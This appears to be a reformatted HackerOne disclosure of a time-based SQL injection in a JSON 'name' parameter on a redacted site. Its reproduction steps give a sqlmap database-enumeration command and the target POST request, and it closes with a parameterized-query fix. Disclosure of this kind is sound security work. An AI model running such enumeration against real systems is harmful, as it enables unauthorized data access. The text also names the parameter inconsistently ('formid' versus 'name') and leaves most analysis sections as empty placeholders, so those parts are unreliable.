# SQL Injection - JSON 'name' parameter

## Metadata
- **Source:** HackerOne
- **Report:** 3257171 | https://hackerone.com/reports/3257171
- **Submitted:** 2025-07-17
- **Reporter:** jonasdiasrebelo
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** high
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
**Description:**

Hi, team!
I discovered a SQL Injection vulnerability in the formid parameter on the website █████████ . The vulnerability allows for the manipulation of SQL queries executed by the backend database, which could potentially lead to unauthorized data access or manipulation.

## References

█████

## Impact

The ability to manipulate SQL queries can lead to:
- Unauthorized access to

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Description:**

Hi, team!
I discovered a SQL Injection vulnerability in the formid parameter on the website █████████ . The vulnerability allows for the manipulation of SQL queries executed by the backend database, which could potentially lead to unauthorized data access or manipulation.

## References

█████

## Impact

The ability to manipulate SQL queries can lead to:
- Unauthorized access to sensitive data.
- Potential data leakage.
- Data manipulation or corruption.
- Full database compromise if administrative permissions are accessible.

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Use this command:

```
sqlmap -r sqlmap.txt --tamper=between --batch -p 'name'  -dbms=Oracle --technique=T --dbs
```

████

The `sqlmap.txt` file:

███

The original request ('name' parameter is what is vulnerable):

```
POST /er2_mrrp/api/v3/hft/subtitle/ HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: ██████████
Cookie: ██████
Content-Type: application/json
Accept: */*
Content-Length: 46
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Host: ██████████
Connection: Keep-alive

{"filters":{"name":"Search-Pag-0-Search-Pag"}}

```

## Suggested Mitigation/Remediation Actions
Use parameterized queries when dealing with SQL queries that contain user input. Parameterized queries allow the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.



</details>

---
*Analysed by Claude on 2026-05-24*
